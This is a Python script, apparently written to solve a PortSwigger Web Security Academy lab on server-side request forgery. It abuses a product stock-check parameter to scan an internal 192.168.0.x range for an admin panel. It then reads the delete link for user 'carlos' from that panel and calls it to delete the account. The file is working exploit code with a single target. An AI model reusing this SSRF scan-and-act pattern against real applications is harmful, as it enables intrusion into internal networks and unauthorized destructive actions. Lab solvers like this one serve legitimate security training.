import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
# author: 0xyf


class SSRF2:
    def __init__(self):
        self.lab_id = "0a1700120437b1d380c771c7008300ab"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def execute_request(self, data):
        r = requests.post(
            self.vuln_url,
            data=data,
            allow_redirects=False,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def ssrf(self):
        for i in range(1, 256):
            ip = f"192.168.0.{i}"
            payload = f"http://{ip}:8080/admin"
            data = {"stockApi": payload, "storeId": 1}
            r = self.execute_request(data)
            if r.status_code == 200:
                print(f"[+] payload: {payload}")
                self.internal_url = data["stockApi"]
                self.get_delete_url(r)
                break

    def get_delete_url(self, r):
        soup = BeautifulSoup(r.text, "html.parser")
        self.carlos_del_url = [
            x["href"] for x in soup.find_all("a") if "carlos" in x["href"]
        ][0][1:]
        print(f"[+] carlos del url: {self.carlos_del_url}")

    def delete_carlos(self):
        print("[+] deleting carlos")
        data = {"stockApi": self.carlos_del_url, "storeId": 1}
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.ssrf()
        self.delete_carlos()
        self.check_solved()


def main():
    SSRF2().solve()


if __name__ == "__main__":
    main()
